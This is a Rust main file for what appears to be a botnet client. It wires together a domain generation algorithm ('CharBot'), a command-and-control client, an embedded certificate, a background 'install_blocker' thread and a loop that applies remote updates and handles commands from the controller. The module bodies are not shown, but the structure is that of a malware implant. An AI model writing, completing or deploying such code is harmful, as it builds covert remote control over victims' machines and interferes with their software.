use bytes::Bytes;
use chrono;
use dga::CharBot;
use message_handler::update;
use std::{
    fs::File,
    io::Write,
    os::fd::{AsRawFd, FromRawFd},
    path::PathBuf,
    sync::{Arc, RwLock},
};

use std::thread;

use serde::{Deserialize, Serialize};

mod comm;
mod dga;
mod install_blocker;
mod message_handler;
mod meta;
mod arpa;

pub const CERT: &[u8] = include_bytes!("../../../keys/cert.pem");

fn main() {
    let meta = Meta::new();

    let dga = Box::new(CharBot::default());
    let (comm, message_rx) = comm::Client::new(meta, dga);
    
    thread::spawn(|| install_blocker::block());
    let comm_handle = thread::spawn(|| comm.main());

    loop {
        let message = message_rx.recv().unwrap();
        match message {
            comm::ClientMessage::Update(bytes) => (update(bytes)),
            comm::ClientMessage::Message(message) => (message_handler::handle_message(message)),
        }
    }
}
